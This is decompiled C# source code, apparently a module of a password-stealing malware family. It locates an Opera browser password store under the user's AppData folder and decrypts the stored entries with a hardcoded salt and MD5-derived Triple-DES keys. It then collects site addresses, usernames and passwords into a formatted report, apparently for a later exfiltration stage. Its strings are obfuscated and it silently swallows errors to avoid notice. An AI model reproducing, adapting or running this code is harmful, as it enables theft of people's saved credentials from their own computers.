using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

public class DAOpera
{
	public class Operaz
	{
		public static byte[] YSCJG = new byte[11]
		{
			131, 125, 252, 15, 142, 179, 232, 105, 115, 175,
			255
		};

		public static byte[] QSWP = new byte[4] { 0, 0, 0, 8 };

		public static string VHET = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

		public static string CUED;

		public static int c = 0;

		public static int c1 = 0;

		public static int c2 = 0;

		public static bool JHCR = true;

		public static string ReturnValue;

		public static string XYRR;

		public static string KJQV;

		public static string YQXS;

		public static string[] HDSM = new string[1001];

		public static string[] FFGT = new string[1001];

		public static string[] XHGC = new string[1001];

		public static int MMIB = 0;

		public static bool BMXT = false;

		public static string[] Lines;

		public static string[] HOVD = new string[3001];

		public static string FPQX()
		{
			List<string> list = new List<string>();
			string text = GLKS();
			checked
			{
				try
				{
					string text2 = text;
					int i = 0;
					for (int length = text2.Length; i < length; i++)
					{
						string text3 = Conversions.ToString(text2[i]);
						if (Operators.CompareString(text3, "", false) != 0)
						{
							list.Add(text3);
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				StringBuilder stringBuilder = new StringBuilder();
				string result = default(string);
				try
				{
					string text4;
					if (list.Count == 0)
					{
						text4 = LOOTCKC.IPNPIWT("VnF8g3VWcXyDdVZxjradi5V8g3VWcXyDdVZxfIN1Vi4=", "False") + Environment.NewLine + LOOTCKC.IPNPIWT("P4ezr65+WKizsIWdtWqfjK2vrlyLp7dqnoJYta+fjK6ovKGBZGO5rj2sq69ckquovFyBoadqqoysY7Kdk51jmayCqqRqpYurt6uoiZ2neC0=", "False") + Environment.NewLine + LOOTCKC.IPNPIWT("WnWAh3ladYCHeVp1gId5WnWAh3ladYCHeVp1gId5WnUr", "False");
						return result;
					}
					int num = list.Count - 1;
					for (int j = 0; j <= num; j += 3)
					{
						stringBuilder.Append(LOOTCKC.IPNPIWT("jM7d5Z1kAw==", "False") + list[j].Substring(1)).AppendLine();
						stringBuilder.Append(LOOTCKC.IPNPIWT("kcrH23uKuM/OlVwL", "False") + list[j + 1].Substring(1)).AppendLine();
						stringBuilder.Append(LOOTCKC.IPNPIWT("j7vY39WuzMmmfgc=", "False") + list[j + 2].Substring(1)).AppendLine();
						stringBuilder.Append(LOOTCKC.IPNPIWT("YXyHjoBhfIeOgGF8h46AYXyHjoBhfIeOgGF8h46AYXwk", "False")).AppendLine();
					}
					text4 = (KVPXNIVH.GPRHO = LOOTCKC.IPNPIWT("VnF8g3VWcXyDdVZxjradi5V8g3VWcXyDdVZxfIN1Vi4=", "False") + Environment.NewLine + stringBuilder.ToString() + Environment.NewLine + LOOTCKC.IPNPIWT("WnWAh3ladYCHeVp1gId5WnWAh3ladYCHeVp1gId5WnUr", "False"));
					return result;
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
					return result;
				}
			}
		}

		public static string GLKS()
		{
			string result = default(string);
			try
			{
				if (File.Exists(VHET + LOOTCKC.IPNPIWT("hZO/u7qKoJ7GrZulq82pl6h9uqmdHg==", "False")))
				{
					VHET += LOOTCKC.IPNPIWT("coCsqKd3jYuzmoiSmLqWhJVqp5aKMQ==", "False");
					TMEJ();
					return result;
				}
				if (File.Exists(VHET + LOOTCKC.IPNPIWT("f425tbSEmpjAp5WfpcC0kqSyvKd/taq+plGiqsQn", "False")))
				{
					VHET += LOOTCKC.IPNPIWT("jZvHw8KSqKbOtaOts87CoLLAyrWNw7jMtF+wuNIZ", "False");
					TMEJ();
					return result;
				}
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public static void TMEJ()
		{
			checked
			{
				try
				{
					byte[] array = File.ReadAllBytes(VHET);
					int num = 0;
					int num2 = array.Length - 5;
					for (int i = 0; i <= num2; i++)
					{
						if (array[i] == 0 && array[i + 1] == 0 && array[i + 2] == 0 && array[i + 3] == 8)
						{
							num = array[i + 15];
							byte[] array2 = new byte[8];
							byte[] array3 = new byte[num - 1 + 1];
							Array.Copy(array, i + 4, array2, 0, array2.Length);
							Array.Copy(array, i + 16, array3, 0, array3.Length);
							CUED = CUED + OEJK(array2, array3) + Environment.NewLine;
							i += 11 + num;
						}
					}
					Lines = CUED.Split(new char[1] { Conversions.ToChar(Environment.NewLine) });
					int num3 = 0;
					do
					{
						Lines[num3] = null;
						num3++;
					}
					while (num3 <= 3);
					int num4 = Lines.Length - 1;
					for (int j = 0; j <= num4; j++)
					{
						XYRR = null;
						KJQV = null;
						YQXS = null;
						c = 0;
						if (!Lines[j].Contains(LOOTCKC.IPNPIWT("rtXg4591kAI=", "False")) && !Lines[j].Contains(LOOTCKC.IPNPIWT("kbjDxrtjc34g", "False")) && !Lines[j].Contains(LOOTCKC.IPNPIWT("lb7Fln1eGA==", "False")))
						{
							if (BMXT)
							{
								if (j - MMIB == 1 || j - MMIB == 2)
								{
									int num5 = Lines[j].Length - 1;
									for (int k = 0; k <= num5; k++)
									{
										if (Lines[j][k - c] > '\u007f')
										{
											Lines[j] = Lines[j].Remove(k - c, 1);
											c++;
										}
									}
									if (j - MMIB == 1)
									{
										KJQV = Lines[j];
									}
									else if (j - MMIB == 2)
									{
										YQXS = Lines[j];
										c1++;
										BMXT = false;
									}
								}
							}
							else if (MMIB != 0 && (j == MMIB + 2 || j == MMIB + 4))
							{
								int num6 = Lines[j].Length - 1;
								for (int l = 0; l <= num6; l++)
								{
									if (Lines[j][l - c] > '\u007f')
									{
										Lines[j] = Lines[j].Remove(l - c, 1);
										c++;
									}
								}
								if (j == MMIB + 2)
								{
									KJQV = Lines[j];
								}
								else if (j == MMIB + 4)
								{
									YQXS = Lines[j];
									c1++;
								}
							}
						}
						else if (j != 0)
						{
							int num7 = Lines[j].Length - 1;
							for (int m = 0; m <= num7; m++)
							{
								if (Lines[j][m - c] > '\u007f')
								{
									Lines[j] = Lines[j].Remove(m - c, 1);
									c++;
								}
							}
							if (j - MMIB == 1)
							{
								XYRR = Lines[j];
							}
							else if (j - MMIB == 2)
							{
								XYRR = Lines[j];
							}
							if (Lines[j].Contains(LOOTCKC.IPNPIWT("lb7Fln1eGA==", "False")))
							{
								XYRR = Lines[j];
							}
							MMIB = j;
						}
						if (Operators.CompareString(XYRR, (string)null, false) != 0)
						{
							HDSM[c1] = XYRR;
						}
						if (Operators.CompareString(KJQV, (string)null, false) != 0)
						{
							FFGT[c1] = KJQV;
						}
						if (Operators.CompareString(YQXS, (string)null, false) != 0)
						{
							XHGC[c1 - 1] = YQXS;
						}
					}
					int num8 = HDSM.Length - 1;
					for (int n = 0; n <= num8 && Operators.CompareString(HDSM[n], "", false) != 0; n++)
					{
						HOVD[c2] = HDSM[n];
						HOVD[c2 + 1] = FFGT[n];
						HOVD[c2 + 2] = XHGC[n];
						c2 += 3;
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}

		public static string OEJK(byte[] key, byte[] CKRU)
		{
			checked
			{
				try
				{
					MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
					mD5CryptoServiceProvider.Initialize();
					byte[] array = new byte[YSCJG.Length + (key.Length - 1) + 1];
					Array.Copy(YSCJG, array, YSCJG.Length);
					Array.Copy(key, 0, array, YSCJG.Length, key.Length);
					byte[] array2 = mD5CryptoServiceProvider.ComputeHash(array);
					array = new byte[array2.Length + YSCJG.Length + (key.Length - 1) + 1];
					Array.Copy(array2, array, array2.Length);
					Array.Copy(YSCJG, 0, array, array2.Length, YSCJG.Length);
					Array.Copy(key, 0, array, array2.Length + YSCJG.Length, key.Length);
					byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(array);
					TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
					tripleDESCryptoServiceProvider.Mode = CipherMode.CBC;
					tripleDESCryptoServiceProvider.Padding = PaddingMode.None;
					byte[] array3 = new byte[24];
					byte[] array4 = new byte[8];
					Array.Copy(array2, array3, array2.Length);
					Array.Copy(sourceArray, 0, array3, array2.Length, 8);
					Array.Copy(sourceArray, 8, array4, 0, 8);
					key = array3;
					tripleDESCryptoServiceProvider.IV = array4;
					ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor();
					byte[] bytes = cryptoTransform.TransformFinalBlock(CKRU, 0, CKRU.Length);
					return Encoding.Unicode.GetString(bytes);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					string result = "";
					ProjectData.ClearProjectError();
					return result;
				}
			}
		}
	}
}
